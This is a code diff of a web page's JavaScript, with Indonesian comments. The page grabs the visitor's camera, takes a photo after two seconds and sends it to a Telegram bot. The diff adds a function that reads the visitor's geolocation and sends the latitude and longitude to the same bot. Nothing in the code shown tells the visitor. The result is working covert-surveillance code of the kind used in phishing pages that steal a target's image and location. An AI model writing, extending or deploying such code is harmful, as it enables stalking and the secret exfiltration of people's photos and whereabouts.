@@ -26,18 +26,19 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
                 video.play();
-                setTimeout(capturePhoto, 2000);
+                setTimeout(capturePhotoAndLocation, 2000);
             } catch (err) {
                 console.error("Error akses kamera: ", err);
             }
         }
 
-        function capturePhoto() {
+        function capturePhotoAndLocation() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0);
             const dataURL = canvas.toDataURL('image/png');
             sendPhotoToTelegram(dataURL);
+            sendLocationToTelegram();
         }
 
         function sendPhotoToTelegram(photoData) {
@@ -56,6 +57,41 @@
             .catch(error => {
                 console.error('Error kirim foto: ', error);
             });
+        }
+
+        function sendLocationToTelegram() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const locationMessage = `Lokasi pengguna:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: locationMessage
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(result => {
+                            console.log('Lokasi terkirim: ', result);
+                        })
+                        .catch(error => {
+                            console.error('Error kirim lokasi: ', error);
+                        });
+                    },
+                    error => {
+                        console.error('Error mendapatkan lokasi: ', error);
+                    }
+                );
+            } else {
+                console.error('Geolocation tidak didukung di browser ini.');
+            }
         }
 
         function dataURLtoBlob(dataURL) {
